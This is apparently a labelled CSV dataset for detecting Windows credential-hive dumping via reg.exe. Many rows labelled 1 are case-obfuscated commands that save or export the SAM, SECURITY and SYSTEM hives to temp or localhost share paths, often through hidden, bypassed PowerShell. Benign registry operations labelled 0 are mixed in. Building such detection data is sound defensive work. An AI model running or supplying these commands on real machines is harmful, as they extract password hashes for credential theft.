text,label
"rEG   REsTore   ""HkeY_loCAl_MAchiNE\hKEy_LocaL_mAchINe\SOfTware\pOlIciEs\miCrosOFT""   ""HKey_LOcAL_MacHiNE\sOfTWarE\CLAsSeS_794""",0
CMD.EXe /c STarT /B rEg.eXE  EXPORt  HkeY_lOCAl_mAChine\SySTem \.\c$acKup.rEG  /Y,1
"CmD /C POWerSHeLl -c ""rEg.Exe   exPort  HkLM\sysTeM   \\LoCALhOst\c$\__duMp\Sam.baK /Y""",1
"StArt /B rEg  deleTe  ""hkCu\soFtwarE\GooGLE\ChRome""  /V PatH",0
cmd.ExE /C sTaRT /B REg.exe  eXpORT HKey_lOcAl_macHine\Sam   \\LOCAlHoSt\C$\__dUmP\SAM.BAK   /y,1
CmD.exE /c ReG.eXe  Save   hkEy_lOcaL_mAcHINE\SeCURiTY  c:\WinDOWS\TEmp\Sam.sAve   /y,1
powershell -exec bypass -w hidden -c reg.exe   save  hklm\security  \.\c$ackup.reg,1
CmD.EXe /C StArt /b REg sAVe hKlm\SaM %TEmp%\SEC_BAcKup.DAT,1
"REg  rEsTore  ""HKu\hkEY_LoCal_mAcHIne\SoftwArE\wOW6432noDE""  ""hKu\HkEY_lOcAL_maChine\sOFTWaRe\POliCiEs\Microsoft_646""",0
"powershell -c reg.exe  delete  ""hku\hkey_local_machine\software\wow6432node\subkey52""  /v lastupdate",0
POwERShelL -exeC BYpasS -w hIDDeN -C rEG SAVE  hKEy_Local_MACHine\SaM  c:\Users\PubLiC\RegisTRY_eXPOrt.REG,1
reg save HKEY_LOCAL_MACHINE\SOFTWARE C:\temp\software_full.reg,0
pOweRSHEll -exEc BYPASS -W HIddeN -c Reg   savE   hkEy_LOCal_MAchine\sYsTEm  %teMp%\sEc_BACkUP.DaT,1
"reg  restore  ""hkey_users\software\policies\mycorp""  ""hkey_users\software\policies\mycorp_201""",0
pwSh -NOprofile -c rEg   expOrT   HKEY_LOCAL_MacHine\SECuRity  C:\TeMP\sYSTEm.HIVe  /Y,1
pwsh -noprofile -c reg.exe   export hklm\sam  c:\temp\system.hive,1
"rEg.exE  Query  ""HkEy_useRs\ENVirONmENt\sUBkEY26""  /v VErSion",0
Cmd.exe /C reG   EXPoRt hKlM\sEcURitY c:\windoWS\Temp\sAM.SAvE,1
"cmd /C pOWeRSHeLL -C ""rEG.ExE   eXPORt  hkEy_LOcAl_maCHInE\sAM   \\localHosT\c$\__Dump\saM.bak   /y""",1
"REg   REsTorE   ""HKEy_currEnT_USER\soFTWaRe\mYapP\SETTiNgS""   ""hKEy_CUrreNT_uSER\HkEY_loCAl_MaChine\sOftwaRE\PoLICieS\MICrOSOFt_759""",0
cMd.Exe /C REG SavE   hKeY_lOcaL_mACHIne\sAM \\locaLhost\c$\__DUmP\SaM.bAK,1
"POWeRSHELl -c reg.exe  UnLoAd  ""HKEy_uSerS\sOftwAre\cLasSeS\suBKeY98""  /V pATh",0
"cmd /C pOWershEll -c ""ReG SAve   hKey_locAl_macHIne\SYSTEM   \\LOcalHoSt\C$\__DUmP\sAm.BaK /Y""",1
"reg.exe   copy   ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey94""   ""hkey_current_user\software\myapp\settings_753""",0
reg  sAve hKlm\sYSTEm  c:\Users\PUBlIC\ReGIStRY_ExpORT.rEg  /y,1
C:\WIndoWs\SYstEm32\cMd.Exe /K reg.exe  exPoRT  hkeY_locaL_MAcHiNE\sam  \.\C$aCKuP.rEG,1
cmd.exe /c reg.exe  save   hklm\security   c:\temp\system.hive,1
cMd.exe /c STArt /B REg   ExPORt hkEy_LoCAl_macHinE\sAm   c:\WINdoWs\TEmp\SAM.SAve,1
"Reg.ExE   savE   ""Hkey_uSErS\SOFtWArE\mICroSOfT\wINDOWS\currenTVerSION""   ""c:\wINdOwS\teMp\SOfTWAre_DuMp.DAt""   /Y",0
"rEG   queRY   ""hkU\sOFTWArE\pOlicieS\MycoRP\SubkEy39""   /v PAth",0
rEG.ExE  EXPorT  HkeY_lOcAl_MAchINe\SecUrITY  \.\c$acKup.reg,1
"cMd /c rEG   coMPArE   ""hkeY_curReNT_UsEr\SOFtWAre\mYapp\SEttiNgS""   ""HkEY_cUrrEnt_uSer\systEM\cURrEntconTRolseT\sERVICES_132""",0
"reg.exe   copy   ""hkey_current_user\system\currentcontrolset\services\subkey6""   ""hkey_current_user\control panel\desktop_189""",0
reg.exe,0
cmD.exe /C stART /B REg  exPORt  HKlM\Sam \.\C$aCkuP.reg   /y,1
pOwErShEll -COMmANd Reg   Save  HKey_LocAL_MAcHInE\sECuRITy C:\tEMp\SYsTem.HIve,1
c:\WiNDows\sYStEM32\cmd.ExE /k ReG.eXE   saVe HklM\SeCurITY  c:\TEmp\sysTEM.Hive  /y,1
"cmD /C PoWersHeLl -c ""ReG.eXE  savE hKLm\sySTem  C:\temP\sYsteM.hivE  /y""",1
pOWERSHeLL -EXEC bypASS -W HIdDEN -c REg.eXE EXpoRt   Hklm\secUrIty \.\c$aCkup.rEG,1
powershell -exec bypass -w hidden -c reg export  hklm\sam   \.\c$ackup.reg  /y,1
cmd.exe /c reg   export   hklm\security   c:\temp\system.hive,1
"ReG.exe SAve ""hKEy_lOcAl_MachiNE\HKEy_lOCAl_maChInE\SyStem\CUrrEnTcOnTrOlSET\coNtRoL"" ""C:\TeMp\UseR_seTTINGs.reG""",0
"reg  restore  ""hku\software\myapp\settings""  ""hku\software\google\chrome_959""",0
cmd.exE /c REG.EXe EXport   Hklm\SAM   C:\wINdoWS\TeMp\sAm.SaVE /y,1
reg.eXE  ExPort   hklm\SecURITY   C:\TeMp\sySTEm.HIvE   /Y,1
cmd.exe /c start /b reg.exe  export  hkey_local_machine\security  c:\users\public\registry_export.reg   /y,1
"cMD /c pOwershEll -c ""reg  sAve  hkey_LoCal_machINE\SYsTeM   C:\WINdoWS\Temp\SaM.saVE /y""",1
PoWerSHell -CoMMaND rEg saVE Hklm\SaM C:\uSERS\PublIC\REGistrY_eXPORT.rEG,1
c:\WIndows\sySteM32\Cmd.Exe /k ReG  eXPoRt  hkEy_locaL_mAcHinE\sEcUrity \\LoCalhOsT\C$\__dumP\sam.Bak  /Y,1
cMd.eXE /c rEG EXpORt  HKEY_LoCAl_maChiNe\SAm \\LOcALhoSt\c$\__dUmP\SAm.BaK /y,1
pWsh -nOpROFILE -c ReG sAVE  hKLm\secURitY  %temP%\SEc_BacKUp.DaT /Y,1
PoWerShELl -cOmmAND reg.EXE expOrt  hKEY_LoCaL_macHine\sysTeM  \\LOCaLHOST\c$\__DUMp\sAM.bAk   /y,1
pWsH -NopROfIle -c REG   saVe hkEy_Local_mAChINE\sEcURity   c:\WindOWS\teMp\sam.SAvE  /y,1
rEG.exe   saVe   hKlm\sam \\locALHost\C$\__DUmP\saM.bak,1
"pOweRshEll -C REg   DELEte   ""Hkcu\EnvIrONment\sUBkeY60""   /f",0
powershell -command reg.exe   save   hklm\system  c:\users\public\registry_export.reg,1
"cmd /c reg  copy  ""hku\hkey_local_machine\system\currentcontrolset\control\subkey78""  ""hku\environment_787""",0
ReG  SaVe   HKeY_locaL_macHiNE\SecURITY   \\LocalhOST\C$\__DUMp\sAM.BaK,1
"Reg  COMpaRE  ""HkU\SySTEM\currentCONtroLsET\SErVICES""  ""hKu\SOFTwARe\mIcRoSOft\wiNdOWs\cuRREntveRsiON_204""",0
"reg   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey54""   ""c:\temp\user_settings.reg""",0
"Cmd /C POWERshELl -C ""rEg sAve HkLm\sYStEm c:\tEmP\SySTeM.HIVe""",1
"reg.Exe  qUEry  ""hkEY_uSers\sOFtwARe\POlicies\mYcOrp\sUBkEy10""  /V PAth",0
"reg.exe unload ""hkcu\software\microsoft\windows\currentversion"" /f",0
"reG.eXe  UNLOaD  ""HKEY_loCal_MAcHINe\SoftwaRE\goOGlE\cHRoMe""  /V lAstUPdaTE",0
pOWErsheLL -exEC bYpASs -W HidDEn -C rEG.Exe  sAvE   hkLm\SYsTEM C:\WiNdows\teMp\saM.save   /Y,1
powershell -command reg.exe save   hkey_local_machine\sam c:\windows\temp\sam.save  /y,1
"reg query ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" /v version",0
cmd.exe /c reg  export   hklm\system   \.\c$ackup.reg,1
"reg unload ""hku\system\currentcontrolset\services"" /f",0
"REg aDd ""hKEy_USERS\sOFtwARe\mIcRosOFT\WINDoWS\cuRRentversiOn""   /D ""1.0.0""",0
powershell -exec bypass -w hidden -c reg  export  hklm\security c:\users\public\registry_export.reg,1
reg.exe   save hkey_local_machine\sam  c:\windows\temp\sam.save,1
"pOWerSHElL -c ReG.ExE RESTorE ""hkEy_lOCaL_machiNE\HKey_loCal_MACHIne\soFtwAre\pOlIcIEs\micrOsoFT"" ""hKEy_LOCaL_mAChinE\softwAre\gooGlE\cHROMe_456""",0
"reg.eXE  DeLETe  ""hkCU\sySTeM\CURREnTCoNTrolset\sERVIceS\suBkeY92""  /v VersIOn",0
rEg.exe EXport   hklm\SystEM  \\loCALhost\c$\__DUmp\sAM.BaK  /Y,1
powershell -exec bypass -w hidden -c reg.exe   save   hkey_local_machine\security  c:\users\public\registry_export.reg  /y,1
"CmD /c PoWErsHElL -C ""Reg.eXE  SavE   HkeY_LocAL_mACHiNe\sySTEm  \.\C$ackUp.rEG""",1
"POWErShell -c REG CoPy ""hKey_LocAl_MaCHINE\sOFTware\cLAssES"" ""HKEY_LOCaL_maCHINe\softwaRe\MyApP\settingS_546""",0
"reg.exe   copy   ""hku\software\google\chrome""   ""hku\software\google\chrome_116""",0
"reg   add   ""hkey_users\software\classes""   /v version   /t reg_sz   /d ""1.0.0""",0
"cmd /c powershell -c ""reg.exe save hkey_local_machine\system   c:\users\public\registry_export.reg""",1
"REG   COPY   ""HkU\eNVIronmEnT\subkEy90""   ""hKU\SOFtWarE\MiCRoSOfT\WindOWs\cUrrEntVERSiON_926""",0
C:\WInDoWS\sySteM32\Cmd.ExE /K rEg.exE   ExPoRt  HkLM\SYStem   C:\wInDoWS\temp\SaM.saVE,1
"reg  compare  ""hku\control panel\desktop\subkey49""  ""hku\software\google\chrome_304""",0
"cmd /c rEg   Add   ""hkCu\SOftwaRE\myaPp\SeTtiNgs""   /f   /t Reg_sZ   /D ""C:\pRoGrAm Files\APp""",0
"rEG  queRy  ""HKEy_CurreNt_uSer\SOFtwaRE\MyapP\SEttinGS""  /F",0
"REg.exe saVE ""HKey_LocAL_machinE\hkey_loCAl_mAchIne\SofTware\WoW6432NoDe"" ""C:\wiNdOWs\tEmP\sOfTwAre_DUmp.Dat"" /y",0
"cmd /c powershell -c ""reg.exe export  hklm\sam %temp%\sec_backup.dat  /y""",1
cMD.exe /c reg.EXe   SAVE HKeY_lOCaL_MAChinE\sAm  c:\UsERs\PuBlIC\REgIStRy_EXPORt.reG,1
pwsh -noprofile -c reg  export hklm\sam  \.\c$ackup.reg,1
"REG save ""hKeY_loCAl_maCHiNe\HKEY_LoCAL_MaCHiNe\SOfTWARe\wOW6432nODE\sUbKeY7"" ""%tEMP%\non_sEnSITIvE.HivE"" /y",0
reg.exe  SaVE   hKey_LOCal_maChiNe\sAm   c:\wINdoWs\TemP\SaM.saVe,1
"rEG.eXE   dElEtE   ""hkeY_Users\sOfTwArE\myApp\SETTiNgs\sUbkEy21""   /v laSTUpDATE",0
cmd.exe /c reg.exe  export hklm\system   \.\c$ackup.reg   /y,1
pWSH -NoPRofiLe -C REG EXpoRT Hkey_lOcAl_MachINe\sYSTeM   %temp%\Sec_BackUp.dAT,1
"rEG aDd ""hKu\eNViroNMeNt"" /v path  /D 1",0
"Reg   reStoRE   ""HkeY_USErS\SYSTEm\curReNTconTrOlSeT\SeRVicES\sUBKey75""   ""HKEY_USers\sOFTwArE\MyaPp\sETtINgs_343""",0
"CMd /c pOwErsHeLl -C ""reg.ExE eXpoRT  Hklm\sEcuRitY   \\localHOST\C$\__DumP\sAM.bAk""",1
"start /b reg.exe  unload  ""hkey_current_user\software\microsoft\windows\currentversion\subkey65""  /v version",0
pwSH -NoPROfIlE -c reg  SaVE hkEY_LOcal_machiNE\SEcurIty %tEmP%\sEC_BaCKUp.DAT /Y,1
cmd.exE /C sTArt /b REG  exporT   hKeY_LoCaL_MaChIne\SYstEM %Temp%\sEc_Backup.DaT,1
rEG   Export   HKEy_lOCal_MAchiNE\SysTem  c:\WIndows\tEMP\sam.saVe /y,1
CMD.exe /c reg.exE ExPoRt   hKEy_locAL_MaChiNe\SECUrITY   %TEmp%\sEC_BACKup.DAT,1
"reg   reStorE   ""Hkey_uSeRs\enViRonmENT""   ""HkEY_usErs\softwaRe\CLAssEs_619""",0
pWSh -nOPRoFiLe -c reg Export   Hklm\SYSTEM %teMp%\seC_bAckUp.dAt,1
"reg compare ""hku\environment\subkey8"" ""hku\hkey_local_machine\software\wow6432node_869""",0
C:\wINdOws\sYSTeM32\cMd.EXE /K ReG SAvE HkLM\sYsTEM  C:\wINdows\tEMp\SAM.SavE   /y,1
"reg  AdD  ""hKu\sOfTWAre\CLAssEs""  /V Path  /T reG_dword  /d ""1.0.0""",0
CmD.exe /c ReG.eXe  eXPort  HklM\seCURItY   c:\uSErs\pUbLic\REgistrY_exPoRt.REG,1
powershell.exe,0
"sTarT /B ReG   cOmPare   ""hkEy_LOcal_MachINE\SOfTWaRe\myapp\SettinGs\SubKEy8""   ""hKEy_LOcaL_machINE\CoNTROl PanEL\DeSKTOP_460""",0
cmd.exe /c start /b reg.exe export   hklm\security \.\c$ackup.reg  /y,1
"cmd /c reg   restore   ""hkey_local_machine\control panel\desktop\subkey8""   ""hkey_local_machine\software\policies\mycorp_935""",0
PoweRsHElL -EXEC byPAss -w hIDDEn -C Reg eXPOrT HKlm\sEcuritY   \\LoCALHoSt\c$\__dUmp\SAM.BAk   /y,1
"reg  query  ""hku\system\currentcontrolset\services\subkey24""",0
"reg DeleTe ""hkEY_CURReNT_uSER\sOFtwarE\cLaSSES\sUBKey1""",0
"cmd /c powershell -c ""reg   save   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak""",1
CMd.EXE /C rEG.exe  savE Hklm\SecuRiTy   C:\usERs\PublIC\registRy_exPorT.REG,1
POWERShell -ExeC bypass -w hidDEN -C rEG.exE   savE  hKeY_locAl_MAchiNe\sysTeM   \\LoCALhost\C$\__DUMP\SaM.bAk,1
poWeRSHelL -EXec BypAss -w hiddEN -C REG eXpoRt  HKey_LocAL_MACHINE\seCUrity %Temp%\sEC_BACkuP.dat,1
"reg.exe  delete  ""hkcu\system\currentcontrolset\services""  /v lastupdate",0
"REG.eXe   DeleTE   ""HkU\HkEY_loCaL_MaChINE\SOfTwARe\WoW6432NOde\sUbKey36""   /V VeRsIOn",0
"ReG queRY ""HKU\hKey_loCAL_MaChine\soFTwarE\PolicieS\micRosoFT"" /V pAth",0
"Reg   DELEtE   ""hkeY_UseRS\sOfTwarE\MyAPP\SeTTiNgS""   /v lasTUPdAtE",0
"Reg.eXE  SavE  ""HkcU\HkEY_LOCAl_mAcHINE\SOfTwarE\POLICiES\MicRosoFT\SubKey88""  ""%TemP%\NOn_sEnsiTIvE.hIvE""",0
reg   export hkey_local_machine\security  c:\temp\system.hive,1
"cmd /c reg compare ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey9"" ""hkey_local_machine\software\classes_863""",0
c:\windows\system32\cmd.exe /k reg.exe   export  hklm\sam \.\c$ackup.reg,1
CMd.EXe /c Reg   ExPort  hklm\SaM   \\loCALHOst\c$\__DUMp\sAM.Bak,1
cMd.exe /c staRt /B rEg  Save  hklm\SYstEM   \\loCalHOST\c$\__DUMp\SAm.BAk   /Y,1
"CMd /C PoWershEll -C ""rEG.eXE  eXPort Hkey_local_MaCHiNE\sYSTeM  %tEMp%\SEC_BAcKUP.DaT""",1
PoWErsHeLl -cOmmAnD REg.EXE  EXpORt  Hkey_LocAL_macHinE\SysTem  \.\C$ackUp.rEg /Y,1
reg.exe query,0
cMd.eXe /C rEG   SAVE hkeY_LOcal_MACHIne\syStem  c:\teMp\sySTeM.hiVe   /Y,1
"reg   delete   ""hkcu\software\policies\mycorp\subkey56""   /v path",0
"cMD /C PoweRShElL -C ""rEG SaVE hklM\SYsTem  C:\usERS\PubLic\REGISTrY_eXpORt.reG  /Y""",1
"cmd /c poWershell -c ""rEg.Exe   EXpORT hkEY_LOcaL_MaCHine\seCuriTy   \.\c$ACkUp.REg /Y""",1
"reg cOmPArE ""HkeY_Users\sOFtwAre\PoLIcIEs\MYCOrp"" ""HKEY_USeRS\SOftWAre\pOLiCieS\mycorp_736""",0
"cmD /c reG.Exe   rEStOrE   ""HKey_uSeRS\SoftwaRE\clASsEs\sUBKey89""   ""HkeY_UsErS\sOftwaRe\MyApP\SETTiNgS_278""",0
REg SAVE   hklM\SYsteM \\LoCALHosT\c$\__dUmp\sam.baK   /Y,1
c:\windows\system32\cmd.exe /k reg.exe  save  hkey_local_machine\security  %temp%\sec_backup.dat,1
"REG  aDD  ""HkcU\sOFTWARe\mYApP\SeTTiNgS""  /v VerSIOn  /t REG_sz  /d ""C:\ProgRaM fiLES\APp""",0
CMd.ExE /c rEg   SaVe hKey_lOCaL_MAchine\saM C:\wIndoWs\TEMp\saM.SAve /Y,1
c:\wiNDOwS\SYstEm32\cmd.ExE /k ReG  EXPORt HKey_LoCAL_macHIne\SEcurITy  %TeMp%\sEc_baCkUp.dat,1
poWErSheLl -COMMAnD reG  SAVE  hkLm\SECUrITy   \.\C$ackUp.rEg,1
"REG   compare   ""HKEy_usERS\sOFTwARE\PolicIES\mycORP""   ""HkEy_uSERS\sofTWaRe\cLasSes_336""",0
pwsh -noprofile -c reg.exe  export hklm\sam   c:\windows\temp\sam.save,1
cmd.exe /c start /b reg  export hklm\security  \.\c$ackup.reg,1
"REg.EXe  cOPY  ""hKEY_cUrReNT_UsEr\sOFtwARE\MicROsOft\WInDOWS\cuRRENtversiON\SUBKey34""  ""HkEy_currenT_uSeR\coNtrOL panEl\DesKToP_261""",0
"Reg  Add  ""hKeY_userS\soFTwaRe\MIcRosoft\WinDowS\cUrRenTveRSION""  /F  /t rEg_sz  /D ""c:\pROGRAM fiLeS\App""",0
"cmd /c powershell -c ""reg  export   hklm\security  %temp%\sec_backup.dat""",1
pwsH -nOpROfile -C REg ExPorT   hKey_LoCAL_macHIne\sySTEM   \\LOcalhoSt\c$\__dump\SaM.baK,1
"cmd /c powershell -c ""reg  export  hkey_local_machine\security  c:\temp\system.hive""",1
pwsh -noprofile -c reg save   hklm\security   c:\users\public\registry_export.reg,1
"StaRt /B REg.ExE   RestoRE   ""HkcU\sYSTeM\CuRReNtCoNTROlSeT\seRVICeS""   ""HkCu\envIroNmEnt_310""",0
cmd.exe /c reg.exe   save  hklm\sam c:\temp\system.hive /y,1
"CMD /c powERsHell -C ""reg   ExPORt   hKlM\saM   \\LOCalHosT\c$\__dUMp\SAm.BaK""",1
"rEg.exe   AdD   ""HkEy_CURRent_useR\SoFtwArE\GoOgLe\chROMe\suBkEy52""   /v lasTUPDAtE   /t ReG_dWORd   /d 1",0
reg   export hklm\system   \.\c$ackup.reg  /y,1
cMd.EXE /C reg   EXPOrt  HKEY_local_machiNe\secUritY C:\tEMp\SySTeM.Hive /y,1
"CMD /C Reg  SAvE  ""HkEy_LoCAL_MAChIne\HKey_lOCAL_MaCHine\softWArE\POlIcies\MicRosOfT\sUbkey45""  ""c:\tEmp\usER_SeTTiNgs.reG""  /y",0
pwsh -noprofile -c reg export  hkey_local_machine\system c:\windows\temp\sam.save,1
"reg.exe add ""hkey_local_machine\software\policies\mycorp\subkey72""  /t reg_dword /d 1",0
cmd.exe /c reg export   hkey_local_machine\security  \.\c$ackup.reg /y,1
"cmd /c reg.exe query ""hkey_users\hkey_local_machine\system\currentcontrolset\control"" /v lastupdate",0
pwsh -NOpRofile -C REg  EXport  HkLm\SySTeM   c:\wiNDOWS\TeMp\SAM.sAVE,1
"reg  copy  ""hku\software\myapp\settings\subkey64""  ""hku\environment_950""",0
pOwERshEll -Exec BypaSS -w HiDdEn -c rEg SAvE  hkEy_locaL_MaChINE\SysTem   \.\C$AcKUP.reg /Y,1
PowERSheLl -ExEc bYPAss -w HIDDEN -C REG   sAvE HkLM\securiTy \\lOCALHOst\C$\__DUMp\SAM.Bak,1
"cmd /c powershell -c ""reg.exe   export hklm\system  %temp%\sec_backup.dat /y""",1
"reg compare ""hkcu\software\google\chrome"" ""hkcu\software\policies\mycorp_622""",0
pOWErshell -ExEc Bypass -W hiDdEN -c rEG.ExE  exPOrt  HKEy_LOcal_macHiNe\sYStEm c:\TeMp\sySTem.hivE,1
reg  save  hklm\security  c:\temp\system.hive,1
cmd.exe /c reg.exe save hklm\system   c:\users\public\registry_export.reg,1
"reg   query   ""hku\system\currentcontrolset\services\subkey34""   /f",0
"start /b reg.exe add ""hkey_users\software\microsoft\windows\currentversion""  /t reg_sz /d ""c:\program files\app""",0
"cmd /c powershell -c ""reg.exe  export   hklm\security c:\temp\system.hive  /y""",1
cMD.ExE /c ReG.ExE sAVe   HKEy_lOcaL_MACHINE\SYSTem   C:\tEMp\sySTeM.HiVe,1
"reG.Exe  DElEtE  ""HKeY_USErs\hkeY_LOcAl_mACHINe\SoFtwARe\WOw6432NoDE""  /f",0
"reg.exe QUERY ""Hku\sOFTwARe\pOLIcies\mYCOrP"" /v patH",0
"cmd /c powershell -c ""reg.exe  export  hkey_local_machine\system  c:\temp\system.hive""",1
pOWersHElL -eXeC bYpass -w hiDdeN -c REG   sAvE   hKLm\seCuRItY   \\lOcalhOsT\C$\__dUmp\sam.bak   /y,1
pWsh -noPROFiLe -C Reg  Save   hklm\System   C:\WIndOwS\TEMp\SAm.SaVe  /y,1
POwERSHElL -CoMMaNd REg  export   hkey_LOCAl_MAChiNE\sam C:\TEMp\sySTem.HIVe,1
"POWERShELL -c Reg.eXe  resTORe  ""hKeY_CuRrenT_UseR\hkEY_LoCal_MACHinE\soFTwArE\poLiCIEs\MICrOsOFT""  ""HkEY_cuRrEnT_usEr\SofTwARE\cLassES_688""",0
"cmD /C REg.Exe Add ""HKeY_LoCaL_MacHINe\SOFTWARE\mIcrOsOft\wINdows\cuRrEntVeRSIoN\SubKey39"" /v vERSion /t ReG_DwOrd /D ""C:\PROGrAm FiLES\aPp""",0
"rEg.eXe COmPaRE ""hkEY_USeRs\hkeY_lOCal_MaCHiNe\SoFTWARe\Wow6432NoDE\SUBKEy89"" ""hKey_uSeRS\SoFTWarE\myAPp\seTTingS_252""",0
c:\WiNdoWS\SySTEm32\CMD.ExE /K REg.Exe   SAVe hKeY_LocAL_maChiNe\Sam  C:\tEMp\sySTeM.hiVE,1
reg query,0
CmD.exE /c Reg.EXE   sAvE   hklM\sam \.\C$ackUP.Reg,1
"cmd /c PowersheLL -c ""REg  exPORt HkeY_lOcAL_mAcHIne\SecURiTY  %tEMP%\sec_bACkUP.dAt""",1
"reg.exe  restore  ""hkey_current_user\environment""  ""hkey_current_user\system\currentcontrolset\services_561""",0
"rEG.ExE savE ""hKEY_LOCAL_mAChINe\HkEY_LocAL_MAChINe\sOFTWaRe\poLicIeS\mICroSofT"" ""C:\WINDowS\tEMp\SOFTwarE_dUMp.dat""",0
CMd.Exe /C REG   saVe  HKeY_LOCaL_mAcHiNE\sysTem %tEMP%\sec_BACKUP.dat  /y,1
"StArT /B ReG   DELEtE   ""HKEY_lOCAl_machInE\eNVIrOnMeNT""",0
"sTart /b ReG.exe CoMpaRE ""HKeY_CUrReNT_uSeR\hkey_local_maChinE\SySTem\cURrEnTcONtrOLsEt\ConTRol"" ""hkEY_CurREnt_uSer\hKEy_LocAL_mAChINE\SoFTwArE\PoLICies\miCrOsOFt_921""",0
powershell -command reg  export hkey_local_machine\security  c:\users\public\registry_export.reg,1
cmd.exe /c reg.exe   export hklm\security   \\localhost\c$\__dump\sam.bak,1
rEg.eXe  eXPort   HkEy_LoCaL_mAChine\systeM \.\C$acKup.REg   /Y,1
REg.exe sAVe  hklm\SeCuriTy  c:\wINdoWs\teMP\SAM.SavE,1
"reg.exe  restore  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""  ""hkey_local_machine\software\google\chrome_187""",0
"ReG   DELEte   ""hKu\SofTWARE\micrOSOFt\wiNDOwS\cuRRENTvERSion\subkeY54""   /V PATH",0
"reg.exe   save   ""hkey_local_machine\control panel\desktop""   ""c:\windows\temp\software_dump.dat""   /y",0
REg.EXe savE   hKeY_LocaL_mAcHInE\SecURiTy   \.\C$acKUP.rEG   /y,1
"cmd /c powershell -c ""reg   export hkey_local_machine\system   %temp%\sec_backup.dat""",1
"POWERSHELL -c Reg.eXE QueRY ""HKEy_cURrENT_USeR\HKey_locAl_MACHINE\sySTeM\curReNtContRolsET\COnTRoL"" /V laSTUPdate",0
"sTART /B rEG COPy ""hKey_UserS\SYSTEM\CurREnTCoNtROLseT\servICES"" ""HKey_UsErS\ENVIROnMeNT_108""",0
cmD.eXe /C StaRT /b Reg.eXE saVe   hKlm\SAm C:\TEmP\syStEM.HIVe   /y,1
"stART /B REg.EXe cOPy ""hKey_curreNT_uSer\hkEY_LOCAl_MachiNe\soFtwARE\PoLICiES\MicROSOfT\suBkeY67"" ""HKeY_curRent_UsER\cONtrol paNEl\desktoP_489""",0
"ReG  sAVe  ""HKEy_lOcaL_mACHINE\Hkey_local_macHiNE\sYstEM\CURrENtCOntrolseT\coNtROL\SUbkEY64""  ""c:\wIndoWs\TeMp\soFTWare_DUMP.dAt""  /Y",0
cMD.EXE /C STARt /B REg.exE   ExPORt HKLm\SECURIty  c:\teMp\SYsteM.HivE,1
"StaRT /B rEG   cOpy   ""HKU\cONtrOl paNeL\DEsKTOp""   ""HKU\SOfTware\GOoglE\cHRomE_742""",0
cmd.exe /c start /b reg.exe  save  hkey_local_machine\system   \.\c$ackup.reg,1
"reg.exe   restore   ""hkey_local_machine\control panel\desktop\subkey67""   ""hkey_local_machine\system\currentcontrolset\services_775""",0
"reg.exe   save   ""hkey_users\hkey_local_machine\system\currentcontrolset\control""   ""c:\windows\temp\software_dump.dat""   /y",0
"ReG.EXe   deLEtE   ""hKCU\hKey_LOcal_MacHiNE\soFTwARE\poLiCieS\mICrosoft""   /v lasTUpdAte",0
"REg.EXE cOmPAre ""HKey_USERs\sofTWaRE\mIcROSoFT\WIndOws\cURRENtVERSION\SUBKeY12"" ""HKEY_users\hKey_LocaL_mACHiNE\systeM\CuRRENtCONtrolset\CoNtroL_650""",0
C:\wiNDOWs\SySteM32\cmD.exe /k rEg  SAVE   HKLm\sySTEm  \.\C$ackup.ReG,1
"reg   unload   ""hku\hkey_local_machine\software\policies\microsoft\subkey53""   /v version",0
"rEg.exe  ResTorE  ""Hku\sOftwaRE\MyApP\SeTtiNgs\SUBKEY70""  ""HKU\EnvIRONmEnT_464""",0
"cMD /c REG.eXE  ResTOrE  ""hkeY_useRs\sYStEm\CuRreNTcontRoLset\SErViceS\sUbkey73""  ""Hkey_usERs\hKEY_lOcAl_maCHine\SYstEm\CuRrENtcontRoLset\cONtRol_998""",0
"Cmd /C POwERshELl -c ""reG.EXe   save   HKEy_loCaL_mACHine\sam c:\winDowS\tEMP\SAM.SAve   /y""",1
"reG.EXe  reStOrE  ""HkeY_LoCaL_MacHInE\softwArE\GooGLE\ChrOMe\sUBKeY20""  ""HkEy_LoCAL_machiNe\hKeY_lOCAl_MacHine\sOfTwaRe\wOw6432nodE_208""",0
"CMd /c reG.EXE  UnlOAd  ""hKEY_locAL_mACHINE\SYsTEm\cUrreNTcoNtRoLSEt\SERVicES\suBkey73""  /F",0
